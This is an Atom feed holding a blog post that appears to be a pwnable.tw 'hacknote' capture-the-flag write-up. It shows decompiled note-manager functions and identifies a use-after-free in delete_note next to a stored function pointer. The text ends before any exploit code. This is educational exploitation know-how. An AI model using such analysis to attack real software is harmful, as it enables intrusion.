@@ -1,0 +1,306 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
+	<title> - use-after-free</title>
+	<link href="/tags/use-after-free/atom.xml" rel="self" type="application/atom+xml"/>
+  <link href="/"/>
+	<generator uri="https://www.getzola.org/">Zola</generator>
+	<updated>2020-03-23T05:57:18.669+00:00</updated>
+	<id>/tags/use-after-free/atom.xml</id>
+	<entry xml:lang="en">
+		<title>pwnable.tw - hacknote</title>
+		<published>2020-01-12T19:40:43.176+00:00</published>
+		<updated>2020-03-23T05:57:18.669+00:00</updated>
+		<link href="/posts/pwnable-tw-hacknote/" type="text/html"/>
+		<id>/posts/pwnable-tw-hacknote/</id>
+		<content type="html">&lt;h1 id=&quot;challenge&quot;&gt;Challenge&lt;&#x2F;h1&gt;
+&lt;blockquote&gt;
+&lt;p&gt;A good Hacker should always take good notes!&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;code&gt;nc chall.pwnable.tw 10102&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
+&lt;&#x2F;blockquote&gt;
+&lt;p&gt;We are also provided a binary and the libc used on the server.&lt;&#x2F;p&gt;
+&lt;h1 id=&quot;solution&quot;&gt;Solution&lt;&#x2F;h1&gt;
+&lt;p&gt;When running the binary, we can see four options:&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;&#x2F;posts&#x2F;pwnable-tw-hacknote&#x2F;5d07df70508cb0091260f634.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;understanding-the-binary&quot;&gt;Understanding the binary&lt;&#x2F;h2&gt;
+&lt;p&gt;When reversing the binary, we can use the shown options to help identify functions used. I reversed the binary in Ghidra, 
+and the following are the cleaned up decompilation output from the binary.&lt;&#x2F;p&gt;
+&lt;span id=&quot;continue-reading&quot;&gt;&lt;&#x2F;span&gt;&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
+&lt;code&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;void &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#795da3;&quot;&gt;add_note&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;void&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+{
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; iVar1;
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;void *&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;_note;
+  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;size_t&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; size;
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;void *&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;contents;
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; in_GS_OFFSET;
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; i;
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;char&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; note_size [&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;];
+  note &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;note;
+  
+  iVar1 &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= *&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;int *&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)(in_GS_OFFSET &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x14&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(counter &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;6&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) {
+    i &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;;
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;while &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(i &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;5&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) {
+      &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;((&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;&amp;amp;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;notes_list)[i] &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(note &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) {
+        _note &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;malloc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+        (&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;&amp;amp;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;notes_list)[i] &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; _note;
+        &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;((&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;&amp;amp;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;notes_list)[i] &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(note &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) {
+          &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;Alloca Error&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+                    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;* WARNING: Subroutine does not return *&#x2F;
+          &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;exit&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+        }
+        (&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;&amp;amp;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;notes_list)[i]-&amp;gt;print_func &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;void *&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x804862b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;;
+        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;printf&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;Note size :&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+        read(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;,note_size,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+        size &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;atoi&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(note_size);
+        note &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;&amp;amp;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;notes_list)[i];
+        contents &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;malloc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(size);
+        note-&amp;gt;contents &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; contents;
+        &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;((&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;&amp;amp;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;notes_list)[i]-&amp;gt;contents &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;char *&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) {
+          &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;Alloca Error&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+                    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;* WARNING: Subroutine does not return *&#x2F;
+          &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;exit&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+        }
+        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;printf&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;Content :&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+        read(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;,(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;&amp;amp;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;notes_list)[i]-&amp;gt;contents,size);
+        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;Success !&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+        counter &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; counter &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;;
+        &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;break&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;;
+      }
+      i &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; i &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;;
+    }
+  }
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;else &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;{
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;Full&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+  }
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(iVar1 &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;!= *&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;int *&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)(in_GS_OFFSET &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x14&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)) {
+                    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;* WARNING: Subroutine does not return *&#x2F;
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;__stack_chk_fail();
+  }
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;return&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;;
+}
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;In the &lt;code&gt;add_note&lt;&#x2F;code&gt; function, we can see that there is a list of notes, called &lt;code&gt;notes_list&lt;&#x2F;code&gt;, and a maximum number of notes allowed. After 6 notes, are created, no more can be created. The &lt;code&gt;note&lt;&#x2F;code&gt; struct contains a pointer to a function at &lt;code&gt;0x804862b&lt;&#x2F;code&gt; and a pointer to &lt;code&gt;malloc&lt;&#x2F;code&gt;ed memory containing the provided contents. There are no obvious heap overflows.&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
+&lt;code&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;void &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#795da3;&quot;&gt;print_func&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;char **&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;param_1)
+
+{
+  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(param_1[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;]);
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;return&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;;
+}
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;This is the function at &lt;code&gt;0x804862b&lt;&#x2F;code&gt;. It simply prints the contents of the note.&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
+&lt;code&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;void &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#795da3;&quot;&gt;delete_note&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;void&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+{
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; iVar1;
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; index;
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; in_GS_OFFSET;
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;char&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; index_str [&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;];
+  
+  iVar1 &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= *&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;int *&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)(in_GS_OFFSET &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x14&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;printf&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;Index :&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+  read(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;,index_str,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+  index &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;atoi&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(index_str);
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;((index &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;|| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(counter &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;&amp;lt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; index)) {
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;Out of bound!&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+                    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;* WARNING: Subroutine does not return *&#x2F;
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;_exit(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+  }
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;((&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;&amp;amp;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;notes_list)[index] &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(note &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) {
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;free&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;((&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;&amp;amp;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;notes_list)[index]-&amp;gt;contents);
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;free&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;((&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;&amp;amp;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;notes_list)[index]);
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;Success&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+  }
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(iVar1 &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;!= *&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;int *&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)(in_GS_OFFSET &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x14&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)) {
+                    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;* WARNING: Subroutine does not return *&#x2F;
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;__stack_chk_fail();
+  }
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;return&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;;
+}
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;The &lt;code&gt;delete_note&lt;&#x2F;code&gt;function has an obvious oversight. It doesn&#x27;t remove the deleted note from the &lt;code&gt;notes_list&lt;&#x2F;code&gt; array. It simply frees the memory that was allocated. &lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
